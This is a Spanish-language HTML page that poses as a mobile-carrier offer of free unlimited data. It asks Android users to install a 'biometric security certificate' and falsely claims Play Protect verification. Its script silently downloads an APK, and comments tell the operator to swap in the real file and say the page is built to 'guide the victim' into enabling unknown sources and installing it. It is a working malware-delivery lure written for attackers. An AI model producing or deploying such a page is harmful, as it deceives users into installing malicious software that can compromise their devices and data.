<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Seguridad - Datos Ilimitados</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        .icon {
            font-size: 50px;
            color: #007bff;
            margin-bottom: 20px;
        }
        h2 { color: #1c1e21; margin-bottom: 10px; }
        p { color: #606770; line-height: 1.5; }
        .btn {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            transition: background 0.3s;
            margin-top: 20px;
            text-decoration: none;
            display: inline-block;
        }
        .btn:hover { background-color: #0056b3; }
        .footer { margin-top: 20px; font-size: 12px; color: #bcc0c4; }
    </style>
</head>
<body>

<div class="card" id="main-content">
    <div class="icon">🛡️</div>
    <h2>Activación de Beneficio</h2>
    <p>Para recibir tus <b>30 días de datos ilimitados</b>, es necesario instalar el certificado de seguridad biométrica en tu dispositivo Android.</p>
    
    <button class="btn" onclick="descargar()">Activar Ahora</button>

    <div class="footer">
        © 2026 Servicio de Red Global • Verificado por Play Protect
    </div>
</div>

<script>
    function descargar() {
        // Reemplaza 'seguridad_biometrica.apk' por el nombre real de tu archivo en GitHub
        const nombreArchivo = 'instalame_ya.apk';
        
        // Crear enlace de descarga invisible
        const link = document.createElement('a');
        link.href = nombreArchivo;
        link.download = nombreArchivo;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

        // Cambiar la interfaz para guiar a la víctima
        document.getElementById('main-content').innerHTML = `
            <div class="icon">📥</div>
            <h2>¡Descarga Iniciada!</h2>
            <p>1. Abre el archivo descargado.<br>
               2. Si Android lo bloquea, ve a <b>Ajustes</b> y permite "Fuentes desconocidas".<br>
               3. Haz clic en <b>Instalar</b> para finalizar la activación.</p>
            <div style="margin-top:20px; font-weight:bold; color:#28a745;">Esperando conexión...</div>
        `;
    }
</script>

</body>
</html>
